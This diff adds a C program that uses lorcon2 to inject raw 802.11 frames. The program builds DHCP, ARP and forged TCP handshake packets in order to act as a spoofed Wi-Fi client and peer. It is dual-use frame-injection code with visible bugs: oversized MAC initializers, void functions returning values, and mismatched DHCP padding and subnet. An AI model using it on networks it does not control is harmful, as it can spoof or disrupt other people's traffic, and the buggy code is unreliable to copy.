@@ -1,0 +1,1167 @@
+#define OPENSSL 1
+#include <stdio.h>
+#include <getopt.h>
+#include <string.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+#include <sys/time.h> 
+#include <lorcon2/lorcon.h> 
+#include <lorcon2/lorcon_packasm.h> 
+#include "common.h"
+#include "sha1.h" 
+#include "md5.c"
+/*************************************************************************/
+                  /*Public Var to Simplfy Function*/
+/*************************************************************************/
+u8 which_client;
+u8 last_ip_byte;
+u8 last_ip_client_byte;
+u8 rx_tcp_seq[4]={0x00,0x00,0x00,0x00};
+u8 tx_tcp_seq[4]={0x00,0x00,0x00,0x00};
+u8 rx_dst_ip[4]={0x00,0x00,0x00,0x00};
+unsigned int rx_dst_port=0;
+unsigned int keep_src_port=0;
+unsigned int frame_seq=0;
+u8 msg=0x00;
+u8 data_num=0;
+u8 rx_tcp_seq_2[4]={0x00,0x00,0x00,0x00};
+u8 tx_tcp_seq_2[4]={0x00,0x00,0x00,0x00};
+u8 rx_dst_ip_2[4]={0x00,0x00,0x00,0x00};
+unsigned int rx_dst_port_2=0;
+/*************************************************************************/
+                            /*Print Result*/
+/*************************************************************************/
+void print_array(char *msg,u8 array[],int length)
+    {
+        int i=0;
+          printf("\n[+]\t %s : ",msg);
+            for(i=0;i<length;++i)
+                 {
+                 if (!((i+1)%(16))) 
+                        printf("\n");
+                 printf("%02X ",array[i]);
+                 }
+    }
+
+void print_pkt(char *msg,lorcon_packet_t * rx_pkt ,int length,int pkt_start)
+    {
+        int i=0;
+          printf("\n[+]\t %s : ",msg);
+            for(i=0;i<length;++i)
+                 {
+                 if (!((i+1)%(16))) 
+                        printf("\n");
+                 printf("%02X ",rx_pkt->packet_header[i+pkt_start]);
+                 }
+    }
+
+/*************************************************************************/
+                            /*Time Function*/
+/*************************************************************************/
+
+double time_diff(struct timeval x , struct timeval y)
+{
+  double x_ms , y_ms ;
+    x_ms = (double)x.tv_sec*1000000 + (double)x.tv_usec;
+    y_ms = (double)y.tv_sec*1000000 + (double)y.tv_usec;
+    return (((double)y_ms - (double)x_ms)/(double) 1000000.0);
+}
+/*************************************************************************/
+                            /*MAC filter*/
+/*************************************************************************/
+int mac_filter(lorcon_packet_t * rx_pkt, uint8_t mac[])
+{
+    int i;
+    for(i=0;i<6;++i)
+    {
+       if(rx_pkt->packet_header[4+i]==mac[i])
+       continue;
+       else
+       return 0;
+    }
+    return 1;
+}
+/*************************************************************************/
+                            /*Frame Filter*/
+/*************************************************************************/
+int frame_type(lorcon_packet_t * rx_pkt,int type)
+{
+    int qos_length=26; 
+    int data_length=24; 
+    int llc_length=8; 
+    int ip_length=20; 
+    int udb_length=8; 
+
+    int l_qos_llc=llc_length+qos_length;
+    int l_qos_llc_server=data_length+llc_length;
+    int l_after_udp=data_length+llc_length+ip_length+udb_length;
+    int after_llc_data=qos_length+llc_length;
+
+    int after_llc_data_server=data_length+llc_length;
+    int after_ip=after_llc_data+ip_length;
+    int after_ip_server=after_llc_data_server+ip_length;
+    if(rx_pkt->packet_header[0]==0xd4 && type==1) 
+        {
+             printf("\n[+]\t Ack Pkt was captured. ");
+             print_pkt("Pkt Info",rx_pkt,10,0);
+             return 1;
+        }
+     else if(rx_pkt->packet_header[l_qos_llc_server+7]==0x01 &&
+             rx_pkt->packet_header[l_qos_llc_server+27]==0x73 &&type==7) 
+        {
+             printf("\n[+]\t Arp request was captured. ");
+             print_pkt("Pkt Info",rx_pkt,10,l_qos_llc);
+             return 7;
+        }
+     else if(rx_pkt->packet_header[l_qos_llc_server+1]==0x01 && type==2) 
+        {
+             printf("\n[+]\t Arp respone was captured. ");
+             print_pkt("Pkt Info",rx_pkt,10,l_qos_llc);
+             return 2;
+        }
+      else if(rx_pkt->packet_header[l_after_udp]==0x02 && type==3) 
+        {
+             last_ip_byte=rx_pkt->packet_header[l_after_udp+19];
+             printf("\n[+]\t DHCP offer was captured.");
+             print_pkt("Pkt Info",rx_pkt,10,l_after_udp+242);
+             return 3;
+        }
+      else if(rx_pkt->packet_header[l_after_udp]==0x02  && rx_pkt->packet_header[l_after_udp+242]==0x05 && type==4) 
+        {
+             printf("\n[+]\t DHCP ACK was captured.");
+             print_pkt("Pkt Info",rx_pkt,10,l_after_udp+242);
+             return 4;
+        }
+      else if(rx_pkt->packet_header[after_llc_data+9]==0x06
+              && rx_pkt->packet_header[after_ip+13]==0x12 && type==5) 
+        {
+             printf("\n[+]\t Sync Ack was recived.");
+             print_pkt("Pkt Info",rx_pkt,10,after_ip+4);
+             return 5;
+        }
+       else if(rx_pkt->packet_header[after_llc_data_server+9]==0x06
+              && rx_pkt->packet_header[after_ip_server+13]==0x02
+              && type==6) 
+        {
+             printf("\n[+]\t Sync was recived.");
+             print_pkt("Pkt Info",rx_pkt,10,after_ip+4);
+             int index_b=after_llc_data_server+12;
+            rx_dst_ip[0]=rx_pkt->packet_header[index_b++]; 
+            rx_dst_ip[1]=rx_pkt->packet_header[index_b++]; 
+            rx_dst_ip[2]=rx_pkt->packet_header[index_b++]; 
+            rx_dst_ip[3]=rx_pkt->packet_header[index_b++]; 
+            print_array("Recived IP address",rx_dst_ip,4);
+            index_b=after_ip_server;
+            if (which_client == 1)
+           {
+            u8 client_dst_port [2] ={0x00} ;
+            client_dst_port[0]=rx_pkt->packet_header[index_b++];
+            client_dst_port[1]=rx_pkt->packet_header[index_b++]; 
+            print_array("Recived Port address ",client_dst_port,2);
+            rx_dst_port=0;
+            rx_dst_port=rx_dst_port+(client_dst_port[0]<<8);
+            rx_dst_port=rx_dst_port+(client_dst_port[1]&0xff);
+            index_b++;
+            index_b++;
+            rx_tcp_seq[0]=rx_pkt->packet_header[index_b++]; 
+            rx_tcp_seq[1]=rx_pkt->packet_header[index_b++]; 
+            rx_tcp_seq[2]=rx_pkt->packet_header[index_b++]; 
+            rx_tcp_seq[3]=rx_pkt->packet_header[index_b++]; 
+           }
+            else if (which_client == 2)
+           {
+            u8 client_dst_port_2[2] ={0x00} ;
+            client_dst_port_2[0]=rx_pkt->packet_header[index_b++]; 
+            client_dst_port_2[1]=rx_pkt->packet_header[index_b++]; 
+            print_array("Recived Port address ",client_dst_port_2,2);
+            rx_dst_port_2=0;
+            rx_dst_port_2=rx_dst_port_2+(client_dst_port_2[0]<<8);
+            rx_dst_port_2=rx_dst_port_2+(client_dst_port_2[1]&0xff);
+            index_b++;
+            index_b++;
+            rx_tcp_seq_2[0]=rx_pkt->packet_header[index_b++]; 
+            rx_tcp_seq_2[1]=rx_pkt->packet_header[index_b++]; 
+            rx_tcp_seq_2[2]=rx_pkt->packet_header[index_b++];
+            rx_tcp_seq_2[3]=rx_pkt->packet_header[index_b++]; 
+           }
+             return 6;
+        }
+
+        else if(  (rx_pkt->packet_header[after_llc_data_server+9]==0x06  ||
+                   rx_pkt->packet_header[after_llc_data_server+2+9]==0x06) &&
+                   (rx_pkt->packet_header[after_ip_server+13]==0x10 ||
+                    rx_pkt->packet_header[after_ip_server+2+13]==0x10) &&
+                    type==8) 
+        {
+             printf("\n[+]\t Sync was recived.");
+             print_pkt("Pkt Info",rx_pkt,10,after_ip+4);
+             return 8;
+        }
+
+    return 0;
+}
+/*************************************************************************/
+                            /*Show captured packet*/
+/*************************************************************************/
+
+int cap_pkt(lorcon_t *context,lorcon_packet_t **rx_packet,uint8_t *macf,int type)
+{
+
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt;
+    int frame_type_f=0;
+    struct timeval before , after;
+    gettimeofday(&before , NULL);
+	while(1) {
+
+	if (lorcon_next_ex(context,rx_packet)< 0 )
+	{
+        printf("\n[!]\t Unable to capture packet type : %d ",type);
+		return 0; 
+	}
+     if(mac_filter(rx_pkt,macf))
+     {
+        if((frame_type_f=frame_type(rx_pkt,type))==type) 
+          {
+
+              return type; 
+          }
+
+        if(rx_pkt->packet_header[0] == 0xc0) 
+          {
+            printf("\n[!]\t DeAuthentication packet recived.... Abort!!");
+            exit(0);
+          }
+     }
+	}
+}
+
+/*************************************************************************/
+////////////////////////////QoS and LLC///////////////////////////
+/*************************************************************************/
+int add_qos_llc(u8 qos_pk[],u8 *mac1,u8 *mac2, u8 *mac3, unsigned int type)
+  {
+    int b_indx=0;
+    qos_pk[b_indx++]=0x88;
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=0x2c; 
+    qos_pk[b_indx++]=0x00;
+    memcpy(qos_pk+b_indx,mac3,6); 
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,mac1,6);
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,mac2,6); 
+    b_indx+=6;
+    frame_seq++;
+    qos_pk[b_indx++]=(frame_seq<<4)&0xff; 
+    qos_pk[b_indx++]=(frame_seq>>4); 
+    qos_pk[b_indx++]=0x00;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0xaa; 
+    qos_pk[b_indx++]=0xaa; 
+    qos_pk[b_indx++]=0x03; 
+    qos_pk[b_indx++]=0x00;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=type>>8;
+    qos_pk[b_indx++]=type; 
+    return b_indx;
+  }
+/*************************************************************************/
+////////////////////////////Data F and LLC///////////////////////////
+/*************************************************************************/
+int add_qos_llc_data(u8 qos_pk[],u8 *mac1,u8 *mac2, u8 *mac3, unsigned int type)
+  {
+    int b_indx=0;
+    qos_pk[b_indx++]=0x88; 
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=0x2c; 
+    qos_pk[b_indx++]=0x00; 
+    memcpy(qos_pk+b_indx,mac3,6); 
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,mac1,6);
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,mac2,6); 
+    b_indx+=6;
+    frame_seq++;
+    qos_pk[b_indx++]=(frame_seq<<4)&0xff; 
+    qos_pk[b_indx++]=(frame_seq<<4)&0xff00; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0xaa; 
+    qos_pk[b_indx++]=0xaa; 
+    qos_pk[b_indx++]=0x03; 
+    qos_pk[b_indx++]=0x00;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00;
+    qos_pk[b_indx++]=type>>8; 
+    qos_pk[b_indx++]=type; 
+    return b_indx;
+  }
+/*************************************************************************/
+////////////////////////Sending ACK Pkt///////////////////////////
+/*************************************************************************/
+
+int send_ack_pkt(u8 *mac1,u8 *mac2,lorcon_t *context)
+{
+    int b_indx=0; //
+    u8 mic_mac[16]={0};
+    u8 qos_pk[208]={0x00};
+    qos_pk[b_indx++]=0xd4; 
+    qos_pk[b_indx++]=0x00;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    memcpy(qos_pk+b_indx,mac2,6); 
+    b_indx+=6;
+    print_array("Ack Pkt Format ",qos_pk,b_indx);
+		if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+		{
+		    printf("\n[+]\t Unable to send ACK pkt... Abort");
+		    return(-1);
+		}
+
+}
+/*************************************************************************/
+/////////////////////////////////IPV4 Header CRC//////////////////////////////
+/*************************************************************************/
+unsigned int ipv4_cksum (u8 qos_pk[],int b_indx, int len)
+ {
+        unsigned int sum_right=0;
+        unsigned int sum_left=0;
+        unsigned int carry_right=0;
+        unsigned int carry_left=0;
+        int i=0;
+        int j=0;
+            for(i=1;i<len;i=i+2)
+                {
+                    sum_right=sum_right+qos_pk[i+b_indx];
+                }
+            carry_right=sum_right>>8;
+            sum_right=sum_right&0xff;
+            sum_left=sum_left+carry_right;
+            for(i=0;i<len;i=i+2)
+                {
+                    sum_left=sum_left+qos_pk[i+b_indx];
+                }
+            carry_left=sum_left>>8;
+            sum_left=sum_left&0xff;
+            sum_right=sum_right+carry_left;
+            carry_right=sum_right>>8;
+            sum_right=sum_right&0xff;
+            sum_left=sum_left+carry_right;
+            carry_left=sum_left>>8;
+            sum_left=sum_left&0xff;
+            sum_right=sum_right+carry_left;
+            return (~((sum_left<<8)+sum_right));
+ }
+
+/*************************************************************************/
+/////////////////////////////////IPV4 Header///////////////////////////////
+/*************************************************************************/
+int ipv4_header(u8 qos_pk[], int b_indx, u8 *src_ip, u8 *dst_ip,unsigned int t_length, u8 protcol)
+  {
+    unsigned int cksum=0;
+    int ipv4_start=b_indx;
+    u8 chsum_location;
+    qos_pk[b_indx++]=0x45; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=(t_length>>8)&0xff; 
+    qos_pk[b_indx++]=(t_length)&0xff;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x02;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x80;
+    qos_pk[b_indx++]=protcol;
+    chsum_location=b_indx;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    memcpy(qos_pk+b_indx,src_ip,4); 
+    b_indx+=4;
+    memcpy(qos_pk+b_indx,dst_ip,4);
+    b_indx+=4;
+    cksum=ipv4_cksum(qos_pk,ipv4_start,20);
+    qos_pk[chsum_location++]=(cksum>>8)&0xff;
+    qos_pk[chsum_location++]=cksum&0xff;
+    return b_indx;
+  }
+/*************************************************************************/
+/////////////////////////////////DHCP Header///////////////////////////////
+/*************************************************************************/
+int dhcp_header(u8 qos_pk[], int b_indx, u8 *client_mac,int type)
+  {
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=0x01;  
+    qos_pk[b_indx++]=0x06;
+    qos_pk[b_indx++]=0x00;  
+    qos_pk[b_indx++]=0x54; 
+    qos_pk[b_indx++]=0x19;  
+    qos_pk[b_indx++]=0x82; 
+    qos_pk[b_indx++]=client_mac[5];  
+    qos_pk[b_indx++]=0x00;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00;  
+    qos_pk[b_indx++]=0x00;  
+    u8 zero_4_byte[4]={0x00};
+    memcpy(qos_pk+b_indx,zero_4_byte,4); 
+    b_indx+=4;
+    memcpy(qos_pk+b_indx,zero_4_byte,4); 
+    b_indx+=4;
+    memcpy(qos_pk+b_indx,zero_4_byte,4);
+    b_indx+=4;
+    memcpy(qos_pk+b_indx,zero_4_byte,4); 
+    b_indx+=4;
+    memcpy(qos_pk+b_indx,client_mac,6); 
+    b_indx+=6;
+    u8 zero_10_byte[10]={0x00};
+    memcpy(qos_pk+b_indx,zero_10_byte,10);
+    b_indx+=10;
+    u8 zero_64_byte[64]={0x00}; 
+    memcpy(qos_pk+b_indx,zero_64_byte,64);
+    b_indx+=64;
+    u8 zero_128_byte[128]={0x00}; 
+    memcpy(qos_pk+b_indx,zero_128_byte,128); 
+    b_indx+=128;
+    qos_pk[b_indx++]=0x63;  
+    qos_pk[b_indx++]=0x82; 
+    qos_pk[b_indx++]=0x53;  
+    qos_pk[b_indx++]=0x63;  
+
+    qos_pk[b_indx++]=0x35; 
+    qos_pk[b_indx++]=0x01; 
+    if(type == 1)
+        qos_pk[b_indx++]=0x01; 
+    if(type == 2)
+        qos_pk[b_indx++]=0x03; 
+
+    if (type==2)
+    {
+    qos_pk[b_indx++]=0x36; 
+    qos_pk[b_indx++]=0x04; 
+    qos_pk[b_indx++]=0xc0; 
+    qos_pk[b_indx++]=0xa8; 
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=0x32; 
+    qos_pk[b_indx++]=0x04; 
+    qos_pk[b_indx++]=0xc0; 
+    qos_pk[b_indx++]=0xa8; 
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=last_ip_byte; 
+    }
+    u8 host_name[9]={0x0c,0x07,0x6b,0x61,0x6c,0x69,0x42,0x49,0x47};
+    memcpy(qos_pk+b_indx,host_name,9);
+    b_indx+=9;
+    u8 para_list[19]={0x37,0x11,0x01,0x1c,0x02,0x03,0x0f,0x06,0x77,
+                      0x0c,0x2c,0x2f,0x1a,0x79,0x2a,0x79,0xf9,0xfc,0x2a};
+    memcpy(qos_pk+b_indx,para_list,19); 
+    b_indx+=19;
+    qos_pk[b_indx++]=0xff;
+    u8 zero_5_byte[50]={0x00};
+    if (type==1)
+    {
+            memcpy(qos_pk+b_indx,zero_5_byte,20); 
+            b_indx+=20;
+
+    }
+    if (type==2)
+    {
+            memcpy(qos_pk+b_indx,zero_5_byte,23); 
+            b_indx+=8;
+
+    }
+    return b_indx;
+  }
+/*************************************************************************/
+/////////////////////////////////UDP Header///////////////////////////////
+/*************************************************************************/
+ int udp_header(u8 qos_pk[], int b_indx, unsigned int src_port, unsigned int dst_port, unsigned int length)
+  {
+    int udp_start=b_indx;
+    qos_pk[b_indx++]=(src_port>>8)&0xff; 
+    qos_pk[b_indx++]=(src_port)&0xff;  
+    qos_pk[b_indx++]=(dst_port>>8)&0xff;
+    qos_pk[b_indx++]=(dst_port)&0xff;  
+    qos_pk[b_indx++]=(length>>8)&0xff; 
+    qos_pk[b_indx++]=(length)&0xff;  
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    return b_indx;
+  }
+/*************************************************************************/
+/////////////////////////////////TCP Synce Header//////////////////////////
+/*************************************************************************/
+ int tcp_sync_ack_header(u8 qos_pk[], int b_indx, unsigned int src_port,
+                         unsigned int dst_port, u8 length, u8 flag)
+  {
+    int tcp_start=b_indx;
+    qos_pk[b_indx++]=(src_port>>8)&0xff; 
+    qos_pk[b_indx++]=(src_port)&0xff; 
+    if (which_client == 1){
+    qos_pk[b_indx++]=(dst_port>>8)&0xff; 
+    qos_pk[b_indx++]=(dst_port)&0xff;  
+    qos_pk[b_indx++]=tx_tcp_seq[0]; 
+    qos_pk[b_indx++]=tx_tcp_seq[1]; 
+    qos_pk[b_indx++]=tx_tcp_seq[2]; 
+    qos_pk[b_indx++]=tx_tcp_seq[3];
+    qos_pk[b_indx++]=rx_tcp_seq[0];
+    qos_pk[b_indx++]=rx_tcp_seq[1];
+    qos_pk[b_indx++]=rx_tcp_seq[2]; 
+    qos_pk[b_indx++]=rx_tcp_seq[3]; 
+    }
+    else if (which_client == 2){
+    qos_pk[b_indx++]=(dst_port>>8)&0xff; 
+    qos_pk[b_indx++]=(dst_port)&0xff; 
+    qos_pk[b_indx++]=tx_tcp_seq_2[0]; 
+    qos_pk[b_indx++]=tx_tcp_seq_2[1]; 
+    qos_pk[b_indx++]=tx_tcp_seq_2[2]; 
+    qos_pk[b_indx++]=tx_tcp_seq_2[3];
+    qos_pk[b_indx++]=rx_tcp_seq_2[0]; 
+    qos_pk[b_indx++]=rx_tcp_seq_2[1]; 
+    qos_pk[b_indx++]=rx_tcp_seq_2[2]; 
+    qos_pk[b_indx++]=rx_tcp_seq_2[3]; 
+    }
+    qos_pk[b_indx++]=length;
+    qos_pk[b_indx++]=flag;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0xff; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    return b_indx;
+  }
+/*************************************************************************/
+////////////////////////////TCP CheckSum/////////////////////////
+/*************************************************************************/
+int tcp_checksum(u8 qos_pk[], u8 *src_ip, u8 *dst_ip, int tcp_length, int tcp_start)
+    {
+
+        unsigned int temp_b_indx=0;
+        unsigned int ck_sum=0;
+        u8 temp_qos_pk[100]={0x00};
+        memcpy(temp_qos_pk+temp_b_indx,src_ip,4); 
+        temp_b_indx+=4;
+        memcpy(temp_qos_pk+temp_b_indx,dst_ip,4); 
+        temp_b_indx+=4;
+        temp_qos_pk[temp_b_indx++]=0x00; 
+        temp_qos_pk[temp_b_indx++]=0x06; 
+        temp_qos_pk[temp_b_indx++]=(tcp_length>>8)&0xff; 
+        temp_qos_pk[temp_b_indx++]=(tcp_length)&0xff;  
+        memcpy(temp_qos_pk+temp_b_indx,qos_pk+tcp_start,tcp_length); 
+        temp_b_indx+=tcp_length;
+        u8 zero_padding[32]={0x00};
+        memcpy(temp_qos_pk+temp_b_indx,zero_padding,16-(temp_b_indx%(16)));
+        temp_b_indx+=(16-(temp_b_indx%(16)));
+        ck_sum=ipv4_cksum(temp_qos_pk,0,temp_b_indx-1);
+        qos_pk[tcp_start+16]=(ck_sum>>8)&0xff; 
+        qos_pk[tcp_start+17]=(ck_sum)&0xff; 
+        return 1;
+
+    }
+/*************************************************************************/
+////////////////////////////TCP 3WayHandShake/////////////////////////
+/*************************************************************************/
+int create_tcp_3way(u8 *mac1, u8 *mac2, u8 *mac3, u8 *src_ip, u8 *dst_ip,
+                     unsigned int src_port, unsigned int dst_port, lorcon_t *context)
+  {
+
+    struct timeval before , after; 
+    gettimeofday(&before , NULL); 
+    lorcon_packet_t **rx_packet; 
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt; 
+    printf ("\n----------------------------");
+	printf("\n[+]\t Starting 3WayHand Shake");
+    printf("\n[+]\t Waiting for SYNC ");
+	if(cap_pkt(context,rx_packet,mac1,6)!=6) 
+         printf("\n[!]\t No Sync was recvied... Abort");
+    if (keep_src_port==0)
+          keep_src_port=rx_dst_port; 
+if(which_client == 1)
+    {rx_tcp_seq[3]=rx_tcp_seq[3]+0x01;
+    tx_tcp_seq[3]=tx_tcp_seq[3];}
+else if(which_client == 2)
+    {rx_tcp_seq_2[3]=rx_tcp_seq_2[3]+0x01;
+    tx_tcp_seq_2[3]=tx_tcp_seq_2[3];}
+    int b_indx=0; //
+    u8 qos_pk[400]={0x00};
+    b_indx=add_qos_llc(qos_pk,mac1,mac2,mac3,0x0800);
+    int qos_llc_header_length=b_indx;
+    b_indx=ipv4_header(qos_pk,b_indx,src_ip,dst_ip,40,6);
+    int tcp_start=b_indx;
+    if (which_client == 1)
+    b_indx=tcp_sync_ack_header(qos_pk,tcp_start,src_port,rx_dst_port,80,0x12);
+    else if(which_client ==2)
+    b_indx=tcp_sync_ack_header(qos_pk,tcp_start,src_port,rx_dst_port_2,80,0x12);
+    int tcp_header_length=b_indx;
+    tcp_checksum(qos_pk,src_ip,dst_ip,20,tcp_start);
+    int repeat=0;
+      for(repeat=0;repeat<3;++repeat)
+	    if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Sending TCP Ack");
+		return -1;
+	}
+	printf("\n[+]\t TCP Ack Sync was sent");
+	printf("\n[+]\t Waiting for WIFI ACK ");
+	if(cap_pkt(context,rx_packet,mac1,1)!=1) 
+         printf("\n[!]\t No WIFI ACK was recvied... Abort");
+	printf("\n[+]\t Waiting for TCP ACK ");
+	if(cap_pkt(context,rx_packet,mac1,8)!=8) 
+         printf("\n[!]\t No TCP ACK was recvied... Abort");
+    gettimeofday(&after , NULL);
+    printf("\n[+]\t Time to finsh 3way handshake %f sec",time_diff(before , after));
+    return 1;
+  }
+/*************************************************************************/
+////////////////////////////TCP Echo pkts/////////////////////////
+/*************************************************************************/
+int create_tcp_echo(u8 *mac1, u8 *mac2, u8 *mac3, u8 *src_ip, u8 *dst_ip,
+                     unsigned int src_port, unsigned int dst_port, lorcon_t *context)
+  {
+    struct timeval before , after; 
+    gettimeofday(&before , NULL); 
+    lorcon_packet_t **rx_packet; 
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt; 
+    printf ("\n----------------------------");
+	printf("\n[+]\t Starting echo packets");
+    int b_indx=0; //
+    u8 qos_pk[400]={0x00};
+    b_indx=add_qos_llc(qos_pk,mac1,mac2,mac3,0x0800);
+    int qos_llc_header_length=b_indx;
+    b_indx=ipv4_header(qos_pk,b_indx,src_ip,dst_ip,42,6);
+    int tcp_start=b_indx;
+    b_indx=tcp_sync_ack_header(qos_pk,tcp_start,src_port,dst_port,80,0x10);
+    qos_pk[b_indx++]=data_num;
+    qos_pk[b_indx++]=msg;
+    int tcp_header_length=b_indx;
+    printf("\n[+]\t Sending echo pkt");
+    tcp_checksum(qos_pk,src_ip,dst_ip,22,tcp_start);
+       printf("\n[+]\t Sending echo pkt");
+
+	    if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Sending TCP Ack");
+		return -1;
+	}
+    gettimeofday(&after , NULL);
+    printf("\n[+]\t Time to echo pkts %f sec",time_diff(before , after));
+    return 1;
+  }
+/*************************************************************************/
+////////////////////////DHCP  Request/Respon///////////////////////////
+/*************************************************************************/
+void create_dhcp(u8 *mac1,u8 *mac2,u8 *mac3,lorcon_t *context)
+{
+    struct timeval before , after; 
+    gettimeofday(&before , NULL); 
+    lorcon_packet_t **rx_packet; 
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt; 
+    printf ("\n----------------------------");
+	printf("\n[+]\t Starting DHCP procedure");
+    int b_indx=0; //
+    int qos_llc_header_length=0;
+    int ip_header_length=0;
+    int udp_header_length=0;
+    int dchp_header_length=0;
+    u8 qos_pk[400]={0x00};
+    u8 src_ip[4]= "\xc0\xa8\x01\x73"; 
+    u8 dst_ip[4]= "\xc0\xa8\x01\x01";
+    b_indx=add_qos_llc(qos_pk,mac1,mac2,mac3,0x0800);
+    qos_llc_header_length=b_indx;
+    b_indx=ipv4_header(qos_pk,b_indx,src_ip,dst_ip,320,17);
+    ip_header_length=b_indx;
+    b_indx=udp_header(qos_pk,b_indx,68,67,299);
+    udp_header_length=b_indx;
+    b_indx=dhcp_header(qos_pk,b_indx,mac1,1);
+    dchp_header_length=b_indx;
+	if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Unable to send IP packet...Abort");
+		return -1;
+	}
+	printf("\n[+]\t DHCP Discover was send ");
+	printf("\n[+]\t Waiting for ACK ");
+	if(cap_pkt(context,rx_packet,mac1,1)!=1) 
+         printf("\n[!]\t No Ack Pkt for DHCP dicover was recvied... Abort");
+    u8 broadcast_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff};
+	printf("\n[+]\t Waiting for DHCP offer ");
+	if(cap_pkt(context,rx_packet,mac1,3)!=3) 
+         printf("\n[!]\t No Ack Pkt for DHCP offer was recvied... Abort");
+    printf("\n[+]\t Sending DHCP request ");
+    b_indx=0; 
+    b_indx=add_qos_llc(qos_pk,mac1,mac2,mac3,0x0800);
+    qos_llc_header_length=b_indx;
+    b_indx=ipv4_header(qos_pk,b_indx,src_ip,dst_ip,320,17);
+    ip_header_length=b_indx;
+    b_indx=udp_header(qos_pk,b_indx,68,67,299);
+    udp_header_length=b_indx;
+    b_indx=dhcp_header(qos_pk,b_indx,mac1,2);
+    dchp_header_length=b_indx;
+
+	if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Unable to send IP packet...Abort");
+		return -1;
+	}
+	printf("\n[+]\t DHCP Request was sent ");
+	printf("\n[+]\t Waiting for ACK ");
+	if(cap_pkt(context,rx_packet,mac1,1)!=1) 
+         printf("\n[!]\t No Ack Pkt for DHCP dicover was recvied... Abort");
+    printf("\n[+]\t Waiting For DHCP ACK ");
+	if(cap_pkt(context,rx_packet,mac1,4)!=4) 
+         printf("\n[!]\t No Ack Pkt for DHCP ACK was recvied... Abort");
+    printf("\n[+]\t Client IP Address is 192.168.3.%d",last_ip_byte);
+    gettimeofday(&after , NULL);
+    printf("\n[+]\t Time to assign IP Address from DHCP %f sec",time_diff(before , after));
+    return 1;
+}
+/*************************************************************************/
+////////////////////////Creating Arp Request///////////////////////////
+/*************************************************************************/
+void create_arp_req(u8 *mac1,u8 *mac2,u8 *mac3 ,u8 *src_ip,u8 *trg_ip,lorcon_t *context)
+{
+    struct timeval before , after; 
+    gettimeofday(&before , NULL);
+    lorcon_packet_t **rx_packet; 
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt;
+    printf ("\n----------------------------");
+	printf("\n[+]\t Sending ARP Request ");
+    int b_indx=0; //
+    u8 qos_pk[62]={0x00};
+    u8 broadcast_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff};
+    u8 zero_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+    b_indx=add_qos_llc(qos_pk,mac1,broadcast_mac,mac3,0x0806);
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=0x08; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x06;
+    qos_pk[b_indx++]=0x04; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x01; 
+    memcpy(qos_pk+b_indx,mac1,6);
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,src_ip,4); 
+    b_indx+=4;
+    memcpy(qos_pk+b_indx,zero_mac,6); 
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,trg_ip,4);
+    b_indx+=4;
+	if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Unable to send ARP Request...Abort");
+		return -1;
+	}
+	printf("\n[+]\t Arp request sent ");
+	printf("\n[+]\t Waiting for ACK ");
+	if(cap_pkt(context,rx_packet,mac1,1)!=1) // Ack pkt rx
+         printf("\n[!]\t No Ack Pkt for Arp request Pkt was rnot eviced... Abort");
+	printf("\n[+]\t Waiting for ARP respone ");
+	if(cap_pkt(context,rx_packet,mac1,2)!=2) // Arp respone
+       printf("\n[!]\t No Ack Pkt for Arp request Pkt was not reviced... Abort");
+    gettimeofday(&after , NULL);
+    printf("\n[+]\t Arp reques/respone took %f sec",time_diff(before , after));
+    return 1;
+}
+/*************************************************************************/
